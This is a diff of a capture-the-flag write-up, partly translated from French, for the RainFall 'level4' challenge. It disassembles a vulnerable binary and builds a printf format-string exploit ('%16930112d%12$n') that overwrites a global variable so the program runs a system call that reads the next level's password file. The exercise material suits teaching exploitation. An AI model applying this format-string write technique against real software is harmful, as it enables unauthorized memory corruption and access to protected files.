@@ -1,12 +1,11 @@
 ./level4
-AAAA
--> AAAA
+BBBB
+-> BBBB
 
 objdump -d level4
--> dans le main appel à n qui appelle fgets
-puis appel à p (qui appelle printf) puis appel system
+When we try diasas main we can see that there is a call to n function which call fgets
 
-fgets non exploitable car fgets et non gets
+We can't exploit fgets because breach that we have see before is for gets.
 
 disas n
    0x08048457 <+0>:     push   %ebp
@@ -22,10 +21,10 @@ disas n
    0x08048485 <+46>:    mov    %eax,(%esp)
    0x08048488 <+49>:    call   0x8048444 <p>
    0x0804848d <+54>:    mov    0x8049810,%eax           0x8049810 <m>:   ""
-   0x08048492 <+59>:    cmp    $0x1025544,%eax          comparaison de eax avec 0x1025544
-   0x08048497 <+64>:    jne    0x80484a5 <n+78>         On skip l'appel system avec pour argument "/bin/cat /home/user/level5/.pass"
-   0x08048499 <+66>:    movl   $0x8048590,(%esp)        si la comparaison fail donc pour faire l'appel system, il faut qu'on réussisse la comparaison
-   0x080484a0 <+73>:    call   0x8048360 <system@plt>   Il faut que eax = 0x1025544
+   0x08048492 <+59>:    cmp    $0x1025544,%eax          comparaison of eax with 0x1025544
+   0x08048497 <+64>:    jne    0x80484a5 <n+78>         If not equal we skip system call with arg "/bin/cat /home/user/level5/.pass"
+   0x08048499 <+66>:    movl   $0x8048590,(%esp)        So we need to get same value in previous comparaison in order to call system
+   0x080484a0 <+73>:    call   0x8048360 <system@plt>   (as previous level) let's find witch value we need : eax = 0x1025544
    0x080484a5 <+78>:    leave  
    0x080484a6 <+79>:    ret  
 
@@ -41,34 +40,41 @@ n+66
 (gdb) x/s 0x8048590
 0x8048590:       "/bin/cat /home/user/level5/.pass"
 
-Comme au level3, on exploite printf
+Kind of same of level3 let's exploit printf
 
 level4@RainFall:~$ python -c 'print "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
 BBBB b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825
+                                                                                    [here]
+So our buffer "BBBB" == "42424242" it's at the 12th
 
-On trouve notre buffer "BBBB" == "42424242" à la 12e position
-
-En little endian, 0x8049810 donne \x10\x98\x04\x08 donc on met ça à la place de notre "BBBB":
+We convert adress of m in little endian so : , 0x8049810-------> \x10\x98\x04\x08
+We insert this adress in our payload
 
 level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
 b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 8049810
+                                                                               [here]
 
-On retrouve bien 0x8049810 à la 12e position
+GREAT, this is 12th 
 
-Ce qu'on veut, c'est écrire à cette adresse 16930116 caractères
+(gdb) p 0x1025544 (eax is compare to 0x1025544)
+$1 = 16930116
+
+---> Whate we want is write to this adress 16930116 char less adresse size (4 bytes) so 16930112
+
 
 level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + 16930112*"A"' | ./level4
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATraceback (most recent call last):
   File "<string>", line 1, in <module>
 IOError: [Errno 32] Broken pipe
 Le buffer de gets nous bloque donc pour écrire, on va utiliser le format specifier %n
+Buffer of gets block us to write, so we'll use format specifier %n
 
 %n "%n is a special format specifier. It cause printf() to load the variable pointed by corresponding argument.
 The loading is done with a value which is equal to the number of characters printed by printf() before the occurrence of %n."
 
 %d "To print a number with a certain (minimum) width, say 5 spaces wide, the format specifier is %5d."
 
-Donc on va utiliser:
+So we'll use:
 
 (python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"') | ./level4
 
